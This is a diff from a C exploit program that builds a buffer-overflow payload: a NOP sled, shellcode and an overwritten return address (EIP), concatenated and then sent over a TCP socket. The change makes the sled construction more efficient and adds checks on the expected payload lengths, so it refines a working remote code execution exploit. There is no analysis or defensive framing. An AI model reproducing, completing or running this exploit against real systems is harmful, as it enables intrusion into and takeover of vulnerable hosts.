@@ -27,19 +27,15 @@ int main(int argc, char *argv[])
 	int s, retval, noplen, len;
 	struct addrinfo Hints, *AddrInfo, *AI;
 	char buffer[SIZE],NOP[SLED + 1];
-	memset(NOP, 0, SLED + 1);
-	int i;
-	for(i = 0; i < SLED; i++)
-	{
-		strcat(NOP,"\x90");
-	}
+	memset(NOP, 0x90, SLED);
+	NOP[SLED] = 0;
 	printf("\n");
-	printf("%d is NOP len\n", strlen(NOP));
-	printf("%d is shellcode len\n", strlen(shellcode));
-	printf("%d is EIP len\n", strlen(EIP));
+	printf("%d is NOP len, expected 87\n", strlen(NOP));
+	printf("%d is shellcode len, expected 117\n", strlen(shellcode));
+	printf("%d is EIP len, expected 4\n", strlen(EIP));
 	sprintf(buffer, "%s%s%s", NOP, shellcode, EIP);
 	len = strlen(buffer);
-	printf("%d is len\n", len);
+	printf("%d is payload len, expected 208\n", len);
 	memset(&Hints,0,sizeof(Hints));
 	Hints.ai_family = AF_UNSPEC;
 	Hints.ai_socktype = SOCK_STREAM;
